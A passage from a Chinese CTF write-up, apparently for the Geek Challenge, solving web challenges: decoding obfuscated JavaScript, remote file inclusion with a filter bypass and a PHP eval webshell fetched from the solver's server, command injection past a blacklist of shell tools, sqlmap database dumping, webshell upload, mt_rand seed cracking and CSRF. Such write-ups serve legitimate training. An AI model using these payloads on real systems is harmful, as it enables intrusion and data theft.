class="line">SYC=~[];SYC=&#123;___:++SYC,$$$$:(![]+&quot;&quot;)[SYC],__$:++SYC,$_$_:(![]+&quot;&quot;)[SYC],_$_:++SYC,$_$$:(&#123;&#125;+&quot;&quot;)[SYC],$$_$:(SYC[SYC]+&quot;&quot;)[SYC],_$$:++SYC,$$$_:(!&quot;&quot;+&quot;&quot;)[SYC],$__:++SYC,$_$:++SYC,$$__:(&#123;&#125;+&quot;&quot;)[SYC],$$_:++SYC,$$$:++SYC,$___:++SYC,$__$:++SYC&#125;;SYC.$_=(SYC.$_=SYC+&quot;&quot;)[SYC.$_$]+(SYC._$=SYC.$_[SYC.__$])+(SYC.$$=(SYC.$+&quot;&quot;)[SYC.__$])+((!SYC)+&quot;&quot;)[SYC._$$]+(SYC.__=SYC.$_[SYC.$$_])+(SYC.$=(!&quot;&quot;+&quot;&quot;)[SYC.__$])+(SYC._=(!&quot;&quot;+&quot;&quot;)[SYC._$_])+SYC.$_[SYC.$_$]+SYC.__+SYC._$+SYC.$;SYC.$$=SYC.$+(!&quot;&quot;+&quot;&quot;)[SYC._$$]+SYC.__+SYC._+SYC.$+SYC.$$;SYC.$=(SYC.___)[SYC.$_][SYC.$_];SYC.$(SYC.$(SYC.$$+&quot;\&quot;&quot;+SYC.$_$_+(![]+&quot;&quot;)[SYC._$_]+SYC.$$$_+&quot;\\&quot;+SYC.__$+SYC.$$_+SYC._$_+SYC.__+&quot;(&#x27;\\&quot;+SYC.__$+SYC._$_+SYC._$$+&quot;\\&quot;+SYC.__$+SYC._$$+SYC.__$+&quot;\\&quot;+SYC.__$+SYC.___+SYC._$$+&quot;&#123;\\&quot;+SYC.__$+SYC.___+SYC.$__+&quot;@\\&quot;+SYC.__$+SYC.$$$+SYC.__$+SYC.___+SYC._+&quot;_\\&quot;+SYC.__$+SYC.__$+SYC.$__+&quot;\\&quot;+SYC.__$+SYC.$_$+SYC.__$+&quot;\\&quot;+SYC.__$+SYC.__$+SYC._$$+&quot;\\&quot;+SYC.__$+SYC.__$+SYC._$$+SYC.$$$_+&quot;_\\&quot;+SYC.__$+SYC.___+SYC.$__+SYC._$$+SYC.$$__+SYC._$+SYC.$$_$+SYC.$$$_+&quot;_\\&quot;+SYC.__$+SYC.___+SYC.$_$+&quot;\\&quot;+SYC.__$+SYC.$_$+SYC.$$_+&quot;\\&quot;+SYC.__$+SYC.___+SYC._$$+SYC._$+SYC.$$_$+&quot;\\&quot;+SYC.__$+SYC.___+SYC.$_$+&quot;&#125;&#x27;);&quot;+&quot;\&quot;&quot;)())();</span><br></pre></td></tr></table></figure><p>这是一串js混淆代码，直接复制到浏览器Console执行：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118144949715.png" alt="image-20221118144949715"></p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;D@y0u_LiKKe_D3code_EnCodE&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x07-题目：ezR-F-I"><a href="#0x07-题目：ezR-F-I" class="headerlink" title="0x07 题目：ezR_F_I"></a>0x07 题目：ezR_F_I</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./ezR_F_I</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 150</span><br><span class="line">description: http://121.5.62.30:7005/</span><br><span class="line">hint: 想要得到flag就快来包含一下叭 可能你需要一台具有公网ip的服务器</span><br><span class="line">=== challenge info ===</span><br></pre></td></tr></table></figure><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p>进入地址：<a target="_blank" rel="noopener" href="http://121.5.62.30:7005/">http://121.5.62.30:7005/</a></p><p>很明显这是远程包含漏洞，经过测试，过滤了<code>http://</code></p><p>可以双写绕过：<code>hthttp://tp://</code></p><p>然后把写好的一句话木马用公网ip的服务器进行远程包含即可</p><blockquote><p>注意这里后缀会自动补上<code>.html</code></p><p>所以传进去的🐎必须是以<code>.html</code>为后缀的，比如这里使用的木马文件名为<code>shell.html</code></p></blockquote><p>一句话木马：</p><p><strong>shell.html</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q1jun&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hthttp://tp://你的公网ip/shell</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118145757459.png" alt="image-20221118145757459"></p><p>使用<code>AntSword</code>上马，拿到flag:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118150307185.png" alt="image-20221118150307185"></p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;Th1s_is_RFI_hahaha!&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x08-题目：ezrce"><a href="#0x08-题目：ezrce" class="headerlink" title="0x08 题目：ezrce"></a>0x08 题目：ezrce</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./ezrce</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 150</span><br><span class="line">description: http://121.5.62.30:7006/ 佛说：你没有女朋友</span><br><span class="line">hint:</span><br><span class="line">=== challenge info ===</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p>进入网址拿到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*佛又曰：输羯吉摩伽无婆羯尼羯驮萨夜南楞婆唵遮参怛烁阿怛度怛唎谨栗南提萨楞度摩谨伽伽墀醯咩驮夜帝俱佛悉呼数写帝尼嚧蒙舍利沙室罚陀俱悉夜喝唵尼孕南写利驮卢罚谨蒙伊谨尼卢利伽豆地皤穆罚驮醯伽无菩钵输烁呼驮数数嚧摩阇钵咩菩卢栗阇室栗罚俱室写耶穆墀摩利楞数皤哆呼无罚埵羯钵怛唎埵吉夜尼帝佛帝墀南吉孕室写南孕怛参阇呼怛伽迦地呼嚧咩参谨南他佛尼利栗数喝呼怛耶啰摩那羯喝萨啰俱婆楞孕孕穆呼哆输伽室利参迦苏摩伊嚧埵罚豆佛写那帝楞室墀度罚娑佛陀豆萨吉埵尼醯尼咩穆伽呼尼伊嚧呼阇娑摩苏驮苏地孕唵苏沙利无伽伊写提曳谨帝栗参啰迦俱菩罚呼遮埵无伽舍萨提遮他南栗醯啰罚曳咩伊娑咩楞咩豆墀钵皤度那沙栗菩夜苏迦迦摩婆萨输舍南沙啰输阇怛佛钵吉那埵南皤度啰孕遮烁沙蒙输他帝婆谨舍沙菩阿地阇遮阿埵输醯怛参栗无羯怛婆参舍无他羯悉遮吉孕羯哆蒙呼阇苏舍曳萨耶悉尼羯提娑谨遮婆罚罚苏婆数钵烁豆利室栗提陀他沙输悉罚唵埵摩迦啰参羯喝伊咩哆菩萨谨唎伊陀孕尼驮尼楞哆提栗悉诃参数嚧啰输罚咩尼罚唵迦沙穆穆无夜哆萨醯孕阇参羯佛耶南夜孕陀驮地醯舍尼驮萨提豆罚伽数阿耶呼栗写遮啰醯利萨嚧豆婆娑唵皤舍伊栗地沙阇婆喝利钵阇皤豆驮迦萨伊摩那唵迦穆羯萨驮娑摩那钵墀卢无陀埵谨哆醯穆醯度提室蒙夜伽悉提醯伊摩尼陀嚧写栗悉舍萨谨嚧提钵啰钵写啰萨墀曳唎埵参耶墀啰那喝迦遮嚧咩苏啰提咩卢耶埵阇楞孕喝怛羯嚧哆俱悉哆阇迦埵呼参舍沙蒙度穆夜皤尼诃无陀那沙沙蒙谨皤尼提诃穆悉罚啰输豆利尼阿栗喝皤豆喝咩咩嚧室曳醯楞墀利那参伽嚧钵输曳墀陀诃婆曳唎孕伽尼楞室谨蒙数唎迦醯帝摩提那谨俱摩婆罚南地他穆唵卢菩尼婆嚧醯写唎遮啰南无俱菩他孕娑怛栗他提卢菩数喝他帝俱诃罚无佛怛醯悉夜唵墀度摩咩帝舍孕豆他醯阿醯南摩沙哆室唎伊烁利驮咩参曳数吉沙钵怛羯伽穆嚧俱提诃罚参那南写数羯驮萨提孕数驮罚栗蒙墀谨驮羯度孕娑摩娑尼豆遮怛提尼陀烁呼喝婆萨沙伊迦羯曳佛遮卢遮尼苏谨啰栗室提参喝吉怛卢墀墀蒙摩利咩萨诃娑罚阿穆地舍尼蒙孕喝皤萨他嚧卢迦输地阿利曳楞喝哆曳喝醯沙诃南舍罚罚数提皤咩南悉伊喝栗摩诃输苏咩啰提吉尼无啰伊咩羯栗菩嚧室那那吉室伽写输南娑输耶墀舍沙无地迦无度提陀穆苏驮利蒙帝菩豆伽豆陀数穆伽度墀室孕卢提啰迦墀那呼俱吉唎地哆夜豆怛喝迦摩皤俱孕阿吉曳烁那阿哆俱输尼穆唎帝他卢烁曳他谨地皤卢地佛苏喝悉唵羯参曳尼啰楞驮沙输耶钵他菩那无曳吉遮罚喝舍输参卢豆伊摩耶曳迦曳夜娑唎墀蒙卢俱喝帝摩度曳曳伊喝他无钵伽吉室唎地唎咩埵舍唵孕尼尼嚧羯呼遮耶室迦墀娑钵驮提伊醯呼室写唎舍参陀南俱摩耶度耶烁写萨萨无伊陀吉墀罚孕利埵那利摩伽钵楞地伽迦喝利他输皤曳卢迦沙怛地写卢伊埵孕诃呼蒙埵输婆写阿唎蒙婆婆萨俱沙栗悉那蒙伽卢诃夜罚输无菩他参写迦诃穆萨他菩皤醯咩孕墀耶室驮钵唵摩埵墀利阇利伽墀埵楞婆喝写埵尼迦吉咩婆陀沙婆喝咩阇室楞豆皤俱楞迦室悉阇婆钵呼阿唎沙迦驮悉烁楞那陀娑楞菩钵埵喝室卢陀俱舍楞钵蒙夜穆帝菩喝地诃提地夜无他阿嚧夜漫</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\&quot;|\&#x27;| |\/|&lt;|&gt;|\\|/i&quot;</span>, <span class="variable">$ip</span>,<span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 3 <span class="subst">$ip</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到一串<code>与佛论禅</code>编码</p><p>使用在线工具<a target="_blank" rel="noopener" href="https://tools.takuron.top/talk-with-buddha/">与佛论禅重制版—Takuron</a>得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新佛曰：愍蜜吽寂聞劫殿塞念婆如菩亦亦隸耨修是如諸亦劫羅若尊喼所是迦諸波嘇莊隸叻兜波修迦空殿修阿迦空眾修殿嚴慧喃諸夷婆般羅嘇羅喃即僧叻薩色羅彌若隸殿愍隸斯陀嚤斯如莊嚤愍色尊彌嘚塞般闍隸羅殿夷塞殿陀祗缽諸哆哆諸殿陀缽如夷劫嘚殿彌缽婆嚤般祗嚩塞嚴咤降婆尊諸咤寂隸咒羅莊所波眾婆婆嚩耨菩殿薩陀降阿薩所寂訶迦諸耨宣喃嘇諸斯聞僧色如訶咒嚤嚴空波阿般耨劫般是缽吽菩喃薩須塞薩莊若闍喃眾如願殿吶波若婆宣塞宣如心摩殿所愍心訶喼隸即般心迦叻羅心隸蜜囉喃殿聞囉念嘚嚤陀菩若修嘚如若迦尊祗薩殿薩殿吶尊嘇闍婆吶殿即耨薩伏哆尊嚤塞咒隸嘇羅祗即殿闍降色殿波嘇心喼波兜兜阿伏吽隸空宣喃如諦嚤彌咤波是婆是降嚩寂殿須</span><br></pre></td></tr></table></figure><p>再使用在线工具<a target="_blank" rel="noopener" href="http://hi.pcmoe.net/Buddha.html">新约佛论禅&#x2F;佛曰加密 - PcMoe!</a> 得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我都懂，我都明白，我是没有策略的防火墙，是被无限绕过的WAF，是扫不出马的EDR，是丢流量的探针，是没升级的态势感知，我守不住内网，也守不住你。<span class="comment">#flag或许会在当前目录#</span></span><br></pre></td></tr></table></figure><blockquote><p>得到提示：flag或许会在当前目录</p></blockquote><p>ok，开始RCE</p><p>看到过滤了这么多指令，不要怕，可以使用<code>\</code>绕过，所以查看当前目录下的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.5.62.30:7006/?ip=;l\s</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.out error.log index.html index.html.1 index.html.2 index.html.3 index.html.4 index.php may_b3_y0u_can_pr0t3ct.php phpinfo.php</span><br></pre></td></tr></table></figure><p>直接访问 <strong>may_b3_y0u_can_pr0t3ct.php</strong></p><p>即可得到flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">❯ curl http://121.5.62.30:7006/may_b3_y0u_can_pr0t3ct.php</span><br></pre></td></tr></table></figure><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;y0u_n33d_a_g1rfr1nd&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x09-题目：WelcomeSQL"><a href="#0x09-题目：WelcomeSQL" class="headerlink" title="0x09 题目：WelcomeSQL"></a>0x09 题目：WelcomeSQL</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./WelcomeSQL</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 150</span><br><span class="line">description: http://120.77.11.65:8100/</span><br><span class="line">hint: 你能找到admin的秘密吗？</span><br><span class="line">=== challenge info ===</span><br><span class="line"></span><br><span class="line">please input your flag:</span><br></pre></td></tr></table></figure><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p>进入网址，F12查看源代码得到提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- By the way, can you GET me your id? --&gt;</span></span><br></pre></td></tr></table></figure><p>GET请求id，猜测id为注入点。</p><p>然后sqlmap一把梭23333</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">❯ sqlmap -u &quot;http://120.77.11.65:8100/?id=1&quot;</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=1 AND 2114=2114</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1 AND (SELECT 5440 FROM (SELECT(SLEEP(5)))bcAD)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: id=-7799 UNION ALL SELECT NULL,CONCAT(0x717a706a71,0x48746f415a4b414a67594743444e6549524972464854567a55744a5857794b744c796f6765766378,0x7178767671)-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>得到注入类型为联合查询注入，下面为sqlmap基本操作，不加以赘述</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">❯ sqlmap -u &quot;http://120.77.11.65:8100/?id=1&quot; --dbs #查数据库名</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] WelcomeSQL</span><br><span class="line">❯ sqlmap -u &quot;http://120.77.11.65:8100/?id=1&quot; -D WelcomeSQL --tables #查表名</span><br><span class="line">Database: WelcomeSQL</span><br><span class="line">[1 table]</span><br><span class="line">+-----------+</span><br><span class="line">| user_info |</span><br><span class="line">+-----------+</span><br><span class="line">❯ sqlmap -u &quot;http://120.77.11.65:8100/?id=1&quot; -D WelcomeSQL -T user_info --columns #查列名</span><br><span class="line">Database: WelcomeSQL</span><br><span class="line">Table: user_info</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| id       | int(11)      |</span><br><span class="line">| secret   | varchar(256) |</span><br><span class="line">| username | varchar(256) |</span><br><span class="line">+----------+--------------+</span><br><span class="line">❯ sqlmap -u &quot;http://120.77.11.65:8100/?id=1&quot; -D WelcomeSQL -T user_info -C secret --dump #dump数据</span><br><span class="line">Database: WelcomeSQL</span><br><span class="line">Table: user_info</span><br><span class="line">[5 entries]</span><br><span class="line">+--------------------------------+</span><br><span class="line">| secret                         |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| an4erniuniu                    |</span><br><span class="line">| myTh3mee33e                    |</span><br><span class="line">| P_God                          |</span><br><span class="line">| SYC&#123;VV31c0me_T0_5QL1_vv01rd_!&#125; |</span><br><span class="line">| vv33l1n                        |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;VV31c0me_T0_5QL1_vv01rd_!&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x0a-题目：babyupload"><a href="#0x0a-题目：babyupload" class="headerlink" title="0x0a 题目：babyupload"></a>0x0a 题目：babyupload</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./babyupload</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 150</span><br><span class="line">description: http://121.5.62.30:7009/</span><br><span class="line">hint: 简单的文件上传</span><br><span class="line">=== challenge info ===</span><br><span class="line"></span><br><span class="line">please input your flag:</span><br></pre></td></tr></table></figure><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p>随便传个图片，在<code>Yakit</code>中将图片的数据全部删掉，换成一句话木马</p><blockquote><p>由于通过前面的题目，我已经知道flag位于“&#x2F;flag”，所以对传入的木马进行简化。</p></blockquote><p>直接读取flag：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118161426099.png" alt="image-20221118161426099"></p><p>得到flag：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118161451903.png" alt="image-20221118161451903"></p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;welc0me_t0_up10ad_wor1d!&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x0b-题目：drinktea"><a href="#0x0b-题目：drinktea" class="headerlink" title="0x0b 题目：drinktea"></a>0x0b 题目：drinktea</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./drinktea</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 250</span><br><span class="line">description: http://mc.vveelin.com.cn:8102/</span><br><span class="line">hint: an4er说想吃双皮奶，你能帮帮他吗？环境每隔30分钟重置；你知道f4tb3e在syc的B站号上分享了什么吗</span><br><span class="line">=== challenge info ===</span><br><span class="line"></span><br><span class="line">please input your flag:</span><br></pre></td></tr></table></figure><h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><p>进入页面，注册一个账号，然后进入反馈页面，在源代码发现了一段php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//真的随机吗？</span></span><br><span class="line"><span class="variable">$seed</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/seed&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();<span class="comment">//   == 1567320364</span></span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;random.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据线索使用工具<code>php_mt_seed</code>爆破出种子：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221120011252030.png" alt="image-20221120011252030"></p><p>seed为<strong>666666</strong></p><p>然后用以下脚本得到<code>$code</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//真的随机吗？</span></span><br><span class="line"><span class="variable">$seed</span> = <span class="number">666666</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$code</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$code = 2bfd7154e1f327a42dae866bac9ecd45</code></p><p>根据题目提示，这应该是提交反馈后利用CSRF获得VIP权限进行购买双皮奶。（后面发现还需要搞钱钱</p><p>在主页中得到提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 管理：mng.php --&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>mng.php</code>后得到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只有狮吼功继承人才能更改VIP权限，用法示例： ?name=f4tb3e&amp;vip=true</span><br></pre></td></tr></table></figure><p>所以构造以下csrf请求语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mc.vveelin.com.cn:8102/mng.php?name=q1jun&amp;vip=true</span><br></pre></td></tr></table></figure><p>过了一会发现自己变成VIP了。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221120012611752.png" alt="image-20221120012611752"></p><p>但是发现购买双皮奶需要999999999999元，那就继续CSRF操作。</p><p>先测试一下转账操作，用<code>yakit</code>抓包:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221120012840203.png" alt="image-20221120012840203"></p><p>发现是POST的CSRF操作…</p><p>构造CSRFpoc：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span 